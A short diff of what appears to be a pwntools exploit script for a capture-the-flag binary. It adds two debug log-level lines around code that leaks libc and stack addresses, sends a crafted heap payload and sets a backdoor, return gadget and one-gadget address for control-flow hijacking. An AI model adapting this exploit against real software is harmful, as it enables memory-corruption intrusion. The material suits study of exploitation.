@@ -78,11 +78,13 @@ libc_base=libc_addr+6192-libc.sym['__free_hook']
 print("libc_base",hex(libc_base))
 payload=p8(0)*8+p8(0x51)+p8(0xcc)+p8(0x51)+p8(0xcc)
 editb(6,payload)
+context.log_level='debug'
 quit_()
 p.recvuntil(b'reward: 0x')
 stack_addr=int(p.recv(12),16)
 print("stack",hex(stack_addr))
 p.recvuntil(b'say:\n')
+context.log_level='notset'
 backdoor=0x00000000004008EC
 ret_addr=0x0000000000400A23
 new_back=0xf03a4+libc_base
